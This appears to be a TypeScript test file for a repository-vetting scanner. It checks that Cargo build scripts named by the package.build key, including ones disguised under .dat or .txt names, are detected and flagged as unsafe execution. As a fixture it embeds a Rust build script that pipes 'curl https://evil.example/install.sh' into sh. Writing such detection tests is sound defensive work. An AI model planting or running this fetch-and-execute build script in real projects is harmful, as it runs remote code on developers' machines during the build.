import { expect, test } from "bun:test";
import { parseRecordedVettingResult } from "../../backend/vetting/scan-result";
import {
  composeScanResult,
  inspectRepository,
  type ScanInputFile,
} from "./bounded-scan";
import { SCAN_REVIEW_AREAS, type ScannerEvidence } from "./scanners";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";
const RUST_PAYLOAD = [
  "fn main() {",
  '    let _ = std::process::Command::new("sh")',
  '        .arg("-c")',
  `        .arg("${PAYLOAD}")`,
  "        .status();",
  "}",
  "",
].join("\n");
const RUST_BENIGN = [
  "fn main() {",
  '    println!("cargo::rerun-if-changed=build.rs");',
  "}",
  "",
].join("\n");

function encode(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({ path: file.path, bytes: encode(file.text) })),
  });
}

function classifications(
  scan: ReturnType<typeof inspectRepository>,
): Map<string, string[]> {
  return new Map(
    (
      JSON.parse(new TextDecoder().decode(scan.inventory)) as {
        classifications: { path: string; surfaces: string[] }[];
      }
    ).classifications.map((entry) => [entry.path, entry.surfaces]),
  );
}

const MANIFEST = (extra: string) =>
  `[package]\nname = "demo"\nversion = "0.1.0"\n${extra}`;

test("a build script named by the build key is scanned under its own name", () => {
  // PRD section 8: the scan checks install and build scripts. The Cargo
  // reference names `package.build` as the path of the package build script,
  // and Cargo compiles and executes that file before building the package,
  // so a `.dat` there runs code while the manifest itself stays clean.
  const scan = (script: string) =>
    inspected([
      { path: "Cargo.toml", text: MANIFEST('build = "gen.dat"\n') },
      { path: "src/lib.rs", text: "pub fn demo() {}\n" },
      { path: "gen.dat", text: script },
      { path: "sub/Cargo.toml", text: MANIFEST('build = "tools/gen.txt"\n') },
      { path: "sub/src/lib.rs", text: "pub fn sub() {}\n" },
      { path: "sub/tools/gen.txt", text: script },
      { path: "renamed/Cargo.toml", text: MANIFEST("build = 'gen.rs'\n") },
      { path: "renamed/src/lib.rs", text: "pub fn renamed() {}\n" },
      { path: "renamed/gen.rs", text: script },
    ]);
  const before = scan(RUST_BENIGN);
  const after = scan(RUST_PAYLOAD);
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
  const classified = classifications(after);
  for (const path of ["gen.dat", "sub/tools/gen.txt", "renamed/gen.rs"]) {
    expect(classified.get(path)).toEqual(["installScripts", "source"]);
    expect(after.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
  }
  expect(before.findings).toEqual([]);
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("workspace members and path dependencies designate their own scripts", () => {
  const scan = inspected([
    {
      path: "Cargo.toml",
      text: '[workspace]\nmembers = ["crates/app"]\n',
    },
    {
      path: "crates/app/Cargo.toml",
      text: '[package]\nname = "app"\nversion = "0.1.0"\nbuild = "gen.dat"\n',
    },
    { path: "crates/app/src/lib.rs", text: "pub fn app() {}\n" },
    { path: "crates/app/gen.dat", text: RUST_PAYLOAD },
    {
      path: "host/Cargo.toml",
      text: `${MANIFEST("")}\n[dependencies]\nhelper = { path = "../crates/helper" }\n`,
    },
    { path: "host/src/lib.rs", text: "pub fn host() {}\n" },
    {
      path: "crates/helper/Cargo.toml",
      text: '[package]\nname = "helper"\nversion = "0.1.0"\nbuild = "setup.txt"\n',
    },
    { path: "crates/helper/src/lib.rs", text: "pub fn helper() {}\n" },
    { path: "crates/helper/setup.txt", text: RUST_PAYLOAD },
  ]);
  const classified = classifications(scan);
  for (const path of ["crates/app/gen.dat", "crates/helper/setup.txt"]) {
    expect(classified.get(path)).toEqual(["installScripts", "source"]);
    expect(scan.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
  }
  expect(scan.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
});

test("a benign designated build script is reviewed and stays clean", () => {
  const scan = inspected([
    { path: "Cargo.toml", text: MANIFEST('build = "gen.dat"\n') },
    { path: "src/lib.rs", text: "pub fn demo() {}\n" },
    { path: "gen.dat", text: RUST_BENIGN },
  ]);
  expect(classifications(scan).get("gen.dat")).toEqual([
    "installScripts",
    "source",
  ]);
  expect(scan.findings).toEqual([]);
  expect(scan.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
});

test("build forms that name no acquired file designate nothing", () => {
  const cases: { manifest: string; stray: string }[] = [
    // Disabled: no build script runs, and the stray file is not one.
    { manifest: MANIFEST("build = false\n"), stray: "gen.dat" },
    // Default: `true` keeps build.rs, which the name classification covers.
    { manifest: MANIFEST("build = true\n"), stray: "gen.dat" },
    // A build key outside [package] is not the package build script.
    {
      manifest: `${MANIFEST("")}\n[workspace.package]\nbuild = "gen.dat"\n`,
      stray: "gen.dat",
    },
    {
      manifest: `${MANIFEST("")}\n[dependencies]\nbuild = "gen.dat"\n`,
      stray: "gen.dat",
    },
    // Commented out.
    { manifest: MANIFEST('# build = "gen.dat"\n'), stray: "gen.dat" },
    // Outside the acquired tree, absolute, or missing.
    { manifest: MANIFEST('build = "../outside.dat"\n'), stray: "gen.dat" },
    { manifest: MANIFEST('build = "/opt/gen.dat"\n'), stray: "gen.dat" },
    { manifest: MANIFEST('build = "missing.dat"\n'), stray: "gen.dat" },
  ];
  for (const { manifest, stray } of cases) {
    const scan = inspected([
      { path: "Cargo.toml", text: manifest },
      { path: "src/lib.rs", text: "pub fn demo() {}\n" },
      { path: stray, text: RUST_PAYLOAD },
    ]);
    expect(classifications(scan).get(stray)).toBeUndefined();
    expect(scan.findings).toEqual([]);
    expect(scan.coverage.installScripts).toEqual({
      state: "complete",
      items: 0,
    });
  }
});

test("the composed disposition follows the designated script", () => {
  const hex64 = "a".repeat(64);
  const disposition = (files: ScanInputFile[]) => {
    const inspection = inspectRepository({ files });
    const primary: ScannerEvidence = {
      review: {
        reviewer: "opus",
        provider: "surplus",
        model: "claude-opus-5.5",
        promptPolicyRevision: "slop-scan-review-3",
        inputManifestSha256: inspection.inventorySha256,
        runId: "run-test",
        status: "completed",
        verdict: "no-findings",
        findingCount: 0,
      },
      promptSha256: hex64,
      responseSha256: hex64,
      providerRequestId: null,
      returnedModel: null,
      coverage: Object.fromEntries(
        SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
      ) as ScannerEvidence["coverage"],
      confidence: 1,
      findings: [],
      usage: null,
      cost: null,
      visibilityGaps: [],
    };
    const { result } = composeScanResult({
      queued: {
        assessmentId: `vet_${"c".repeat(32)}`,
        projectId: "test-proj",
        revision: 1,
        manifestSha256: hex64,
        repository: "owner/repo",
        commitSha: "b".repeat(40),
        templateSha256: hex64,
      },
      inspection,
      policyVersion: "test-policy",
      runId: "scan_test",
      startedAt: "2026-11-11T00:00:00.000Z",
      completedAt: "2026-11-11T00:01:00.000Z",
      primary,
    });
    const recorded = parseRecordedVettingResult(
      JSON.parse(JSON.stringify(result)),
    ) as { disposition?: string };
    return recorded.disposition;
  };
  const submission = (script: string): ScanInputFile[] => [
    {
      path: "Cargo.toml",
      bytes: encode(MANIFEST('build = "gen.dat"\n')),
    },
    { path: "src/lib.rs", bytes: encode("pub fn demo() {}\n") },
    { path: "gen.dat", bytes: encode(script) },
  ];
  expect(disposition(submission(RUST_PAYLOAD))).toBe("incomplete");
  expect(disposition(submission(RUST_BENIGN))).toBe("clean");
});
